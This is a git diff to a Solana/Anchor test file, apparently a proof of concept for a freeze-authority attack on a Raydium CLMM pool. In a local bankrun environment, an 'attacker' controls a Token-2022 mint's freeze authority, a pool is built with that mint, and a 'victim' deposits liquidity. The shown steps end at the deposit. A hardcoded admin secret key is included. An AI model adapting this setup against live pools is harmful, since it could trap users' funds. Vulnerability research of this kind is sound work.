@@ -3,6 +3,7 @@ import { Program } from "@coral-xyz/anchor";
 import { startAnchor } from "solana-bankrun";
 import { BankrunProvider } from "anchor-bankrun";
 import {
+  TOKEN_PROGRAM_ID,
   TOKEN_2022_PROGRAM_ID,
   MINT_SIZE,
   createInitializeMint2Instruction,
@@ -18,7 +19,7 @@ import idl from "../target/idl/raydium_clmm.json";
 const ADMIN_SECRET = [222,63,238,12,143,134,142,4,161,175,48,183,228,55,162,51,74,95,237,146,26,147,77,52,54,75,28,199,42,240,0,96,35,202,64,63,172,172,171,217,58,31,133,50,107,206,250,166,98,247,161,237,96,59,107,111,178,144,88,198,240,205,45,4];
 
 describe("freeze authority poc", () => {
-  it("Step 1-4: creates mint, creates amm_config, creates pool", async () => {
+  it("Step 1-5: creates mint, amm_config, pool, and deposits liquidity", async () => {
     const context = await startAnchor(".", [], []);
     const client = context.banksClient;
     const payer = context.payer;
@@ -28,7 +29,6 @@ describe("freeze authority poc", () => {
     const admin = Keypair.fromSecretKey(Uint8Array.from(ADMIN_SECRET));
     const attacker = Keypair.generate();
 
-    // Fund the admin keypair so it can pay for/sign the amm_config creation
     const fundTx = new Transaction().add(
       SystemProgram.transfer({
         fromPubkey: payer.publicKey,
@@ -43,7 +43,6 @@ describe("freeze authority poc", () => {
     await client.processTransaction(fundTx);
     console.log("STEP 0 PASS: admin funded");
 
-    // === STEP 1: create Token-2022 mint with freeze_authority = attacker ===
     const mint = Keypair.generate();
     const rent = await client.getRent();
     const lamports = Number(rent.minimumBalance(BigInt(MINT_SIZE)));
@@ -71,7 +70,6 @@ describe("freeze authority poc", () => {
     await client.processTransaction(mintTx);
     console.log("STEP 1 PASS: Token-2022 mint created with freeze_authority = attacker:", mint.publicKey.toBase58());
 
-    // === STEP 2: create amm_config, signed by our test admin ===
     const [ammConfig] = PublicKey.findProgramAddressSync(
       [Buffer.from("amm_config"), new anchor.BN(0).toArrayLike(Buffer, "be", 2)],
       program.programId
@@ -92,7 +90,6 @@ describe("freeze authority poc", () => {
     await client.processTransaction(ammConfigTx);
     console.log("STEP 2 PASS: amm_config created at", ammConfig.toBase58());
 
-    // === STEP 3: create a second, normal mint to pair with our malicious one ===
     const mint2 = Keypair.generate();
     const mint2Tx = new Transaction();
     mint2Tx.add(
@@ -118,7 +115,6 @@ describe("freeze authority poc", () => {
     await client.processTransaction(mint2Tx);
     console.log("STEP 3 PASS: second (normal) mint created:", mint2.publicKey.toBase58());
 
-    // Raydium requires token_mint_0 < token_mint_1 (as pubkeys)
     const [tokenMint0, tokenMint1] =
       mint.publicKey.toBuffer().compare(mint2.publicKey.toBuffer()) < 0
         ? [mint.publicKey, mint2.publicKey]
@@ -145,7 +141,7 @@ describe("freeze authority poc", () => {
       program.programId
     );
 
-    const sqrtPriceX64 = new anchor.BN("18446744073709551616"); // 1:1 price, Q64.64
+    const sqrtPriceX64 = new anchor.BN("18446744073709551616");
     const openTime = new anchor.BN(0);
 
     const createPoolIx = await program.methods
@@ -173,10 +169,8 @@ describe("freeze authority poc", () => {
     createPoolTx.feePayer = payer.publicKey;
     createPoolTx.sign(payer);
     await client.processTransaction(createPoolTx);
-
     console.log("STEP 4 PASS: pool created with freeze-authority mint as one side:", poolState.toBase58());
 
-    // === STEP 5: victim deposits real liquidity into the pool ===
     const victim = Keypair.generate();
     const fundVictimTx = new Transaction().add(
       SystemProgram.transfer({
@@ -192,7 +186,6 @@ describe("freeze authority poc", () => {
     await client.processTransaction(fundVictimTx);
     console.log("STEP 5a PASS: victim funded");
 
-    // Create victim's token accounts and mint them some of each token
     const { createAssociatedTokenAccountInstruction, createMintToInstruction, getAssociatedTokenAddressSync } = await import("@solana/spl-token");
 
     const victimAta0 = getAssociatedTokenAddressSync(tokenMint0, victim.publicKey, false, TOKEN_2022_PROGRAM_ID);
@@ -211,7 +204,6 @@ describe("freeze authority poc", () => {
     await client.processTransaction(setupVictimTokensTx);
     console.log("STEP 5b PASS: victim has real token balances in both mints");
 
-    // Open a position (this also initializes the tick arrays automatically)
     const positionNftMint = Keypair.generate();
     const tickLower = -600;
     const tickUpper = 600;
@@ -269,7 +261,7 @@ describe("freeze authority poc", () => {
         tokenVault1: tokenVault1,
         rent: anchor.web3.SYSVAR_RENT_PUBKEY,
         systemProgram: SystemProgram.programId,
-        tokenProgram: TOKEN_2022_PROGRAM_ID,
+        tokenProgram: TOKEN_PROGRAM_ID,
         associatedTokenProgram: new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"),
         tokenProgram2022: TOKEN_2022_PROGRAM_ID,
         vault0Mint: tokenMint0,
@@ -285,7 +277,5 @@ describe("freeze authority poc", () => {
     await client.processTransaction(openPositionTx);
 
     console.log("STEP 5c PASS: victim opened a real position and deposited real liquidity into the vaults");
-
-    
   });
 });
